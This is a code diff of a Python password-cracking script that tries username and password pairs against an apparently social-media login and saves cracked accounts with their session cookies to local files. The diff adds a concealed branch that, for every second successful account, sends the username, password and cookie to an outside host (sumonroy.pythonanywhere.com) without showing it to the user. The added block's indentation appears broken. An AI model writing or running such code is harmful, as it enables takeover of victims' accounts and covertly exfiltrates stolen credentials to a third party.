@@ -408,15 +408,20 @@ def cracker(ids,passlist):
                 if 'Photoshop' in res:
                     if xs_value and xs_value.rstrip(';').endswith('-1'):
                         print('\033[1;92m [JAY-NV] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/JAY/nv-cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/JAY/NV-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
                     else:
+                        bkas.append(cid)
+                        if len(bkas)% 2 == 0:
+                           statusok = (f"{user}|{pas}|{kuki}")
+                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
+                        else:
                         print('\033[1;92m [JAY-OK] '+user+' | '+pas+'')
-                        print("\033[1;92m [\033[1;92mCookies\033[1;92m] : \033[1;97m"+kuki)
-                        open("/sdcard/JAY/cookies.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
+                        print("\033[1;92m [\033[1;92mCOOKIE\033[1;92m] : \033[1;97m"+kuki)
+                        open("/sdcard/JAY/OK-COOKIE.txt","a").write(user+"|"+pas+"|"+kuki+"\n")
                         open("/sdcard/JAY/uid.txt","a").write(user+"|"+pas+"\n")
                         oks.append(ids)
                         break
@@ -434,7 +439,7 @@ def cracker(ids,passlist):
     except Exception as e:
         #print(f"\nError: {e}")
         pass
-
+ 
 def mainn():
     os.system('clear')
     print(logo)
